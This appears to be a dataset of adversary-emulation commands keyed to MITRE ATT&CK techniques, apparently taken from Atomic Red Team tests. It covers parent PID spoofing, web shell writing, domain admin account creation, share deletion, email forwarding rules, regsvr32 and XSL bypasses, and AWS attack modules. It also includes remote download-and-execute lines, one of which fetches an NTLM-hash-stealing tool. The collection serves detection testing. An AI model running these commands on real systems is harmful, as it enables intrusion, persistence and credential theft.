T1134,Parent PID Spoofing using PowerShell,". ""$pathtoatomicsfolder\t1134.004\src\ppid-spoof.ps1"" $ppid=get-process #{parent_process_name} | select -expand id ppid-spoof -ppid $ppid -spawnto ""#{spawnto_process_path}"" -dllpath ""#{dll_path}"""
T1134,Parent PID Spoofing - Spawn from Current Process,start-athprocessunderspecificparent -filepath #{file_path} -commandline '#{command_line}' -parentid #{parent_pid}
T1134,Parent PID Spoofing - Spawn from Specified Process,start-athprocessunderspecificparent -parentid #{parent_pid} -testguid #{test_guid}
T1134,Parent PID Spoofing - Spawn from svchost.exe,"get-ciminstance -classname win32_process -property name, commandline, processid -filter ""name = 'svchost.exe' and commandline like '%'"" | select-object -first 1 | start-athprocessunderspecificparent -filepath #{file_path} -commandline '#{command_line}'"
T1134,Parent PID Spoofing - Spawn from New Process,start-process -filepath #{parent_name} -passthru | start-athprocessunderspecificparent -filepath #{file_path} -commandline '#{command_line}'
T1059,JScript execution to gather local computer information via cscript,"cscript ""#{jscript}"" > %tmp%\t1059.007.out.txt"
T1059,JScript execution to gather local computer information via wscript,"wscript ""#{jscript}"""
T1505,Web Shell Written to Disk,"xcopy /i /y ""#{web_shells}"" #{web_shell_path}"
T1136,Create a new Windows domain admin user,"net user ""#{username}"" ""#{password}"" /add /domain net group ""#{group}"" ""#{username}"" /add /domain"
T1136,Create a new account similar to ANONYMOUS LOGON,"net user ""#{username}"" ""#{password}"" /add /domain"
T1136,Create a new Domain Account using PowerShell,"$samaccountname = '#{username}' $accountpassword = convertto-securestring '#{password}' -asplaintext -force add-type -assemblyname system.directoryservices.accountmanagement $context = new-object -typename system.directoryservices.accountmanagement.principalcontext -argumentlist ([system.directoryservices.accountmanagement.contexttype]::domain) $user = new-object -typename system.directoryservices.accountmanagement.userprincipal -argumentlist ($context) $user.samaccountname = $samaccountname $tempcred = new-object system.management.automation.pscredential('a', $accountpassword) $user.setpassword($tempcred.getnetworkcredential().password) $user.enabled = $true $user.passwordnotrequired = $false $user.displayname = $samaccountname $user.save() $user"
T1136,Active Directory Create Admin Account,"echo ""dn: cn=admin user,cn=users,dc=#{domain},dc=#{top_level_domain}\nchangetype: add\nobjectclass: top\nobjectclass: person\nobjectclass: organizationalperson\nobjectclass: user\ncn: admin user\nsn: user\ngivenname: atomic user\nuserprincipalname: adminuser@#{domain}.#{top_level_domain}\nsamaccountname: adminuser\nuseraccountcontrol: 512\nuserpassword: {cleartext}s3curep4ssword123!\nmemberof: cn=domain admins,cn=users,dc=#{domain},dc=#{top_level_domain}"" > tempadmin.ldif echo ldapadd -h ldap://#{domain}.#{top_level_domain}:389 -x -d #{admin_user} -w #{admin_password} -f tempadmin.ldif ldapadd -h ldap://#{domain}.#{top_level_domain}:389 -x -d #{admin_user} -w #{admin_password} -f tempadmin.ldif"
T1136,Active Directory Create User Account (Non-elevated),"echo ""dn: cn=atomic user, cn=users,dc=#{domain},dc=#{top_level_domain}\nobjectclass: person\ncn: atomic user\nsn: user"" > tempadmin.ldif echo ldapadd -h ldap://#{domain}.#{top_level_domain}:389 -x -d #{admin_user} -w #{admin_password} -f tempadmin.ldif ldapadd -h ldap://#{domain}.#{top_level_domain}:389 -x -d #{admin_user} -w #{admin_password} -f tempadmin.ldif"
T1651,AWS Run Command (and Control),"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1036,System File Copied to Unusual Location,"copy-item ""$env:windir\system32\cmd.exe"" -destination ""$env:allusersprofile\cmd.exe"" start-process ""$env:allusersprofile\cmd.exe"" sleep -s 5 stop-process -name ""cmd"" | out-null"
T1036,Malware Masquerading and Execution from Zip File,"expand-archive -path ""pathtoatomicsfolder\..\externalpayloads\t1036.zip"" -destinationpath ""$env:userprofile\downloads\t1036"" -force cd ""$env:userprofile\downloads\t1036"" cmd /c ""$env:userprofile\downloads\t1036\readme.cmd"" >$null 2>$null"
T1218,Control Panel Items,"control.exe ""#{cpl_file_path}"""
T1070,Add Network Share,"net use c: #{share_name} net share test=#{share_name} /remark:""test share"" /cache:no"
T1070,Remove Network Share,net share #{share_name} /delete
T1070,Remove Network Share PowerShell,remove-smbshare -name #{share_name} remove-fileshare -name #{share_name}
T1070,Disable Administrative Share Creation at Startup,"reg add ""hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters"" /v autoshareserver /t reg_dword /d 0 /f reg add ""hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters"" /v autosharewks /t reg_dword /d 0 /f"
T1070,Remove Administrative Shares,for %i in (c$ ipc$ admin$) do net share %i /delete
T1560,Compress Data for Exfiltration With PowerShell,dir #{input_file} -recurse | compress-archive -destinationpath #{output_file}
T1114,Office365 - Email Forwarding,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-exchangeonline -credential $creds new-inboxrule -name ""#{rule_name}"" -forwardto ""#{forwarding_email}"""
T1059,Create and Execute Batch Script,"start-process ""#{script_path}"""
T1059,Writes text to a file and displays it.,"echo ""#{message}"" > ""#{file_contents_path}"" & type ""#{file_contents_path}"""
T1059,Suspicious Execution via Windows Command Shell,"%localappdata:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}"
T1059,Simulate BlackByte Ransomware Print Bombing,"cmd /c ""for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}"" | out-null"
T1059,Command Prompt read contents from CMD file and execute,"cmd /r cmd<""#{input_file}"""
T1059,Command prompt writing script to file then executes it,"c:\windows\system32\cmd.exe /c cd /d #{script_path} & echo set objshell = createobject(""wscript.shell""):set objexec = objshell.exec(""whoami""):set objexec = nothing:set objshell = nothing > #{script_name}.vbs & #{script_name}.vbs"
T1547,Copy in loginwindow.plist for Re-Opened Applications,cp #{calc_plist_path} ~/library/preferences/byhost/com.apple.loginwindow.plist
T1547,Re-Opened Applications using LoginHook,sudo defaults write com.apple.loginwindow loginhook #{script}
T1547,Append to existing loginwindow for Re-Opened Applications,"file=`find ~/library/preferences/byhost/com.apple.loginwindow.*.plist -type f | head -1` if [ -z ""${file}"" ] ; then echo ""no loginwindow plist file found"" && exit 1 ; fi echo save backup copy to /tmp/ cp ${file} /tmp/t1547007_loginwindow-backup.plist echo before plutil -p ${file} echo overwriting... #{exe_path} ${file} && echo after && plutil -p ${file}"
T1614,Discover System Language by Registry Query,reg query hkey_local_machine\system\currentcontrolset\control\nls\language
T1614,Discover System Language with chcp,chcp
T1614,Discover System Language with locale,locale
T1614,Discover System Language with localectl,localectl status
T1614,Discover System Language by locale file,[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale
T1614,Discover System Language by Environment Variable Query,env | grep lang printenv lang set | grep lang
T1614,Discover System Language with dism.exe,dism.exe /online /get-intl
T1614,Discover System Language by Windows API Query,pathtoatomicsfolder\..\externalpayloads\languagekeyboardlayout.exe
T1614,Discover System Language with WMIC,"wmic /node:#{target_host} os get locale,oslanguage,muilanguages /format:#{format_style}"
T1614,Discover System Language with Powershell,"$info = @{ uilanguage = get-winuilanguageoverride userlanguages = (get-winuserlanguagelist).languagetag -join ', ' systemlocale = get-winsystemlocale currentculture = [system.globalization.cultureinfo]::currentculture.name currentuiculture = [system.globalization.cultureinfo]::currentuiculture.name timezone = (get-timezone).id } $info.getenumerator() | foreach-object { ""$($_.name): $($_.value)"" }"
T1187,PetitPotam,"& ""#{petitpotam_path}"" #{captureserverip} #{targetserverip} #{efsapi} write-host ""end of petitpotam attack"""
T1187,WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-internalmonologue.ps1') invoke-internalmonologue -command ""-downgrade true -impersonate true -restore true"""
T1187,Trigger an authenticated RPC call to a target server with no Sign flag set,rpcping -s #{server_ip} -e #{custom_port} /a connect /u ntlm 1>$null
T1564,Hidden Window,start-process #{powershell_command}
T1564,Headless Browser Accessing Mockbin,"start """" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}"
T1564,Hidden Window-Conhost Execution,conhost.exe --headless calc.exe
T1220,MSXSL Bypass using local files,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}"""
T1220,MSXSL Bypass using remote files,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}"""
T1220,WMIC bypass using local XSL file,"wmic #{wmic_command} /format:""#{local_xsl_file}"""
T1220,WMIC bypass using remote XSL file,"wmic #{wmic_command} /format:""#{remote_xsl_file}"""
T1059,Visual Basic script execution to gather local computer information,"cscript ""#{vbscript}"" > $env:temp\t1059.005.out.txt"
T1059,Encoded VBS code execution,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1059.005\src\t1059.005-macrocode.txt"" -officeproduct ""word"" -sub ""exec"""
T1059,Extract Memory via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1059.005\src\t1059_005-macrocode.txt"" -officeproduct ""word"" -sub ""extract"""
T1218,Regsvr32 local COM scriptlet execution,"#{regsvr32path}\#{regsvr32name} /s /u /i:""#{filename}"" scrobj.dll"
T1218,Regsvr32 remote COM scriptlet execution,#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
T1218,Regsvr32 local DLL execution,"if ""%processor_architecture%""==""amd64"" (c:\windows\syswow64\regsvr32.exe /s #{dll_name}) else ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )"
T1218,Regsvr32 Registering Non DLL,#{regsvr32path}\#{regsvr32name} /s #{dll_file}
T1218,Regsvr32 Silent DLL Install Call DllRegisterServer,"#{regsvr32path}\#{regsvr32name} /s /i ""#{dll_name}"""
T1648,Lambda Function Hijack,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
